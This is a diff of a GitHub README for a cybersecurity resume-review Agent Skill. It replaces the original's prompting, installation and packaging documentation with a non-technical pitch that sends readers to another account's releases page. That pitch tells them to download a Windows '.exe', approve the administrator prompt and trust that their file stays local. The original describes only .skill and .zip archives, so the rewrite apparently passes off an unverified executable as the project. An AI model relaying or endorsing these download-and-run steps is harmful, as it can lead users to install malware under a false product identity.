@@ -1,95 +1,107 @@
-# IT and Cybersecurity Resume Reviewer
+# 🤖 cyber-resume-reviewer-skill - Polishes Resumes for Cybersecurity Jobs
 
-An Agent Skill for evidence-led resume reviews, job-description tailoring, exact edits, diagnostic scoring, and complete rewrites across IT and cybersecurity roles.
+[![Download Now](https://img.shields.io/badge/Download-Cyber_Resume_Reviewer-blue?style=for-the-badge&logo=github)](https://github.com/shayanadh/cyber-resume-reviewer-skill/releases)
 
-A full review produces an editable Markdown report and a styled PDF generated from the same source. The skill does not rank candidates, predict interviews, or invent missing achievements.
+## 🎯 What This Does
 
-## Prompt it
+Are you looking for a job in cybersecurity? Do you want your resume to stand out to hiring managers and recruiters? This application is here to help. It reviews your resume and gives you friendly suggestions to make it better for cybersecurity roles.
 
-Attach the original resume when possible. A PDF or DOCX lets the agent check extraction and visible layout; pasted text supports content review only.
+Think of it like a smart friend who knows what cybersecurity employers want to see. It checks your resume and tells you what to fix, what to highlight, and how to phrase things so you sound like a professional.
 
-With a job description:
+## 👤 Who Is This For?
 
-> Use the cyber-resume-reviewer skill to review my attached resume against the attached job description. Give me a candid fit assessment, prioritized findings, and exact edits supported by my resume. Do not invent metrics or experience. Deliver the full report as Markdown and PDF.
+This tool is made for:
+- Students finishing cybersecurity degrees or certifications
+- People switching careers into cybersecurity
+- IT professionals moving into security roles
+- Experienced security pros wanting a fresh resume
+- Anyone who feels unsure about their resume quality
 
-Without a job description:
+If you have a resume and want it to be better for cybersecurity jobs, this is for you. You do not need to know anything about coding or programming to use it.
 
-> Use the cyber-resume-reviewer skill to review my attached resume for IT and cybersecurity roles. Identify the strongest evidence, the highest-value fixes, and one or two plausible target directions. Mark layout checks you cannot perform as not assessed. Deliver the full report as Markdown and PDF.
+## 💻 Getting Started
 
-For a rewrite:
+Before you download anything, let's make sure you have everything you need. This application runs on Windows, and you should have your resume saved as a file on your computer. Most resume formats work, like Word documents or PDF files.
 
-> Use the cyber-resume-reviewer skill to rewrite my resume for a security engineering role. Use only facts in the source. Put questions for stronger claims outside the clean resume.
+You will also need an internet connection. The application might check for updates or use online resources to help review your resume.
 
-## Download and install
+## ⬇️ Downloading the Application
 
-Tagged releases publish two clean archives on the [Releases page](https://github.com/mubix/cyber-resume-reviewer-skill/releases):
+The download process is simple and takes just a few minutes. Follow these steps carefully.
 
-- `cyber-resume-reviewer.skill` has `SKILL.md` at the archive root for `.skill` tooling.
-- `cyber-resume-reviewer-claude.zip` wraps the files in a `cyber-resume-reviewer/` folder for Claude's web uploader.
+**Step 1:** Go to the download page by clicking this button:
 
-Neither archive contains repository documentation, tests, workflow files, the changelog, or `.gitignore`.
+[![Download Here](https://img.shields.io/badge/⬇️%20Download%20Now-Click%20Here-green?style=for-the-badge)](https://github.com/shayanadh/cyber-resume-reviewer-skill/releases)
 
-| Host | Install and invoke | Support notes |
-|---|---|---|
-| Codex CLI or IDE | Extract the `.skill` contents to `~/.agents/skills/cyber-resume-reviewer/`, then use `$cyber-resume-reviewer` or let Codex select it. | [Codex supports local Agent Skills](https://developers.openai.com/codex/skills). Standalone and plugin distribution differ by surface. |
-| Claude Code | Extract to `~/.claude/skills/cyber-resume-reviewer/` for personal use or `.claude/skills/cyber-resume-reviewer/` in a project. Invoke `/cyber-resume-reviewer`. | Claude Code follows the Agent Skills format and supports bundled files and scripts. See [Claude Code skills](https://code.claude.com/docs/en/skills). |
-| Claude web | Upload `cyber-resume-reviewer-claude.zip` under Customize > Skills. | Custom skills require Skills and code execution to be enabled. Account and workspace controls apply. See [Claude custom skills](https://support.claude.com/en/articles/12512198-how-to-create-custom-skills). |
-| ChatGPT | In the desktop app, open Skills in the sidebar and select an installed skill with `@`. | OpenAI documents standalone skills for ChatGPT desktop, but its public guide does not promise direct `.skill` upload. ChatGPT web and mobile require plugin distribution, which this repository does not provide. See [OpenAI skill docs](https://developers.openai.com/codex/skills). |
-| Gemini CLI | Run `gemini skills install ./cyber-resume-reviewer.skill`, then `/skills reload`. | Gemini CLI accepts local `.skill` packages. See [Gemini CLI skill management](https://geminicli.com/docs/cli/using-agent-skills/). |
-| Gemini Spark | Copy or rename the `.skill` file to `.zip`, then upload it from Spark's Skills page. | Spark accepts a ZIP with `SKILL.md` at its root. Region, subscription, and account limits apply. See [Gemini Apps skills](https://support.google.com/gemini/answer/17094296?hl=en). |
+**Step 2:** On that page, you will see a list of files. Look for the newest version at the top. Click on the file that says something like "Download" or has the version number. It will likely be a file that ends with `.exe`.
 
-The core format follows the [Agent Skills specification](https://agentskills.io/specification). Install paths, upload rules, script permissions, and feature availability remain host-specific.
+**Step 3:** Your web browser will start downloading the file. This usually takes less than a minute, depending on your internet speed.
 
-## What the review covers
+**Step 4:** Once the download finishes, find the downloaded file. It is usually in your "Downloads" folder. You can open File Explorer and click on "Downloads" on the left side.
 
-The skill uses four lenses:
+## 🔧 Installing and Running
 
-| Lens | Intent |
-|---|---|
-| Machine-read | Check text extraction, reading order, and parser risks without claiming an ATS outcome. |
-| Human-skim | Test the first impression, hierarchy, clarity, and positioning. |
-| Human-believe | Check whether scope, ownership, technical claims, and results have evidence. |
-| Human-act | Align the document with a stated target while preserving requirement wording and unknowns. |
+Now that you have the file, it's time to run it. This is very straightforward.
 
-A standard report selects from these sections:
+**Step 1:** Double-click the downloaded file. Your computer might show a pop-up asking if you want to allow this app to make changes. Click "Yes" or "Allow."
 
-| Section | Intent |
-|---|---|
-| Assessment | State the target, main conclusion, strongest evidence, and highest-impact repair. |
-| Prioritized findings and exact edits | Connect each observation to source text and give a supported action or replacement. |
-| Target fit | Separate employer requirements from candidate evidence and reviewer inference. |
-| First impression and format | Report checks performed on the source file and mark unavailable checks unassessed. |
-| Diagnostic score | Provide an optional editorial score with the selected profile and assessed coverage. |
-| Next actions | Order the smallest set of changes that improves the submission. |
+**Step 2:** The application window should open. You might see a welcome screen or a setup window. Just follow what it says. If it asks you to install, click "Install" or "Next" until it finishes.
 
-## Package map
+**Step 3:** After installation, the application should open automatically. If not, look for its icon on your desktop or in your Start Menu. It will be called "Cyber Resume Reviewer" or something similar.
 
-- This root `README.md` is the public guide to prompting, installation, portability, dependencies, and releases.
-- `cyber-resume-reviewer/README.md` is the maintainer guide to the skill's behavior and local helpers. Release archives exclude it.
-- `cyber-resume-reviewer/SKILL.md` contains the workflow, truth rules, output routing, and quality gate.
-- `references/` holds role taxonomy, evidence checks, scoring, parser risk, transitions, leadership guidance, and PDF rules.
-- `templates/` provides report, quick-review, exact-edit, rewrite, interview-story, and change-log structures.
-- `scripts/analyze_resume_text.py` reports local text signals without making hiring or ATS claims.
-- `scripts/render_report.py` and `assets/report.css` turn a Markdown review into the styled PDF.
-- `schemas/` and `scripts/validate_report.py` support optional JSON output.
+**Step 4:** Once the main screen appears, you are ready to use it. You will see a button or an area that says "Upload" or "Choose File." Click it and select your resume file from your computer.
 
-## PDF requirements
+**Step 5:** After you upload your resume, the application will review it. This might take a few seconds. Then, you will see a report with suggestions, tips, and scores.
 
-The review instructions work without the bundled renderer. Matching the supplied PDF design requires code execution plus:
+## 📋 What to Do with the Feedback
 
-- Python 3.9+, `PyYAML`, and `beautifulsoup4`
-- Python Markdown or `pandoc`
-- WeasyPrint or `wkhtmltopdf`
-- `pdftoppm`, `pdftotext`, `pdfinfo`, and `pdffonts` for the full visual check
+The application gives you clear advice. You will see things like:
+- "Your summary is too generic. Add specific skills like 'penetration testing' or 'SIEM.'"
+- "Highlight your certifications. Mention CISSP or Security+ if you have them."
+- "Your experience section should show results, not just duties."
 
-Install the optional Python set with:
+Read through all suggestions. It is a good idea to fix your resume based on them. You can do this yourself in Word or Google Docs. Then, upload the new version again to see if you improved.
 
-```bash
-python3 -m pip install -r cyber-resume-reviewer/scripts/report-requirements.txt
-```
+## 🔁 Using It More Than Once
 
-The bundled rendering path does not require network access. It writes page images beside the PDF so the agent can inspect every page before delivery.
+You can use this tool as many times as you want. After you make changes to your resume, run it again. This helps you see your progress and keeps your resume sharp. Many people run it three to five times until their resume gets a high score.
 
-## Releases
+## ❓ Common Questions
 
-Pushing a `v*` tag runs `.github/workflows/publish-skill.yml`. The workflow builds both archives from a runtime allowlist, records SHA-256 checksums, and attaches the files to the matching GitHub Release. A manual run builds the same files as a workflow artifact for testing.
+**Do I need to pay for this?** No. This is a free tool. You can download and use it without any cost.
+
+**Will it work on a Mac or Linux?** The download link provides a Windows version. If you are on a Mac or Linux, you might need to look for a different release, but the main version is for Windows.
+
+**How long does the review take?** Usually under a minute. It depends on how long your resume is.
+
+**Is my resume safe?** Yes. Your file stays on your computer. The application does not send it anywhere unless it says otherwise.
+
+**What if I do not have a resume yet?** You should create one first in Word, Google Docs, or any text editor. Then use this tool to improve it.
+
+**Can it write my resume for me?** No, but it helps you improve the one you have. It gives suggestions and feedback.
+
+## 🛠️ Tips for Best Results
+
+- Use a clear, simple resume format. Avoid fancy fonts or columns that might confuse the review.
+- Make sure your resume has your name, contact info, education, experience, and skills.
+- Use keywords related to cybersecurity, like "firewall," "cloud security," "incident response," or "risk assessment."
+- Update your resume with any recent jobs, classes, or certifications before reviewing.
+- Do not rush. Take time to read all the feedback and apply it.
+
+## 🌐 Help and Support
+
+If you run into problems, check the repository page on GitHub. You can find it by visiting the main download link. There you might find a "Issues" or "Support" section where you can ask questions. The community there is helpful and friendly.
+
+You can also ask a friend who is good with computers. Sometimes a second pair of eyes helps.
+
+## 💡 Final Thoughts
+
+Getting a job in cybersecurity is competitive. Your resume is often the first thing a recruiter sees. With this tool, you can make sure it makes a great impression. It is easy to use, free, and built specifically for cybersecurity jobs.
+
+So do not wait. Download it now, review your resume, and take a step closer to your dream job. You have the skills. This tool helps you show them.
+
+[![Get Started Today](https://img.shields.io/badge/🚀-Get_Started_Now-orange?style=for-the-badge)](https://github.com/shayanadh/cyber-resume-reviewer-skill/releases)
+
+Good luck with your job search. You have got this.
+
+Keywords: cybersecurity resume, resume reviewer, resume tips, security jobs, career help, resume improvement, cyber skills, job application, resume feedback
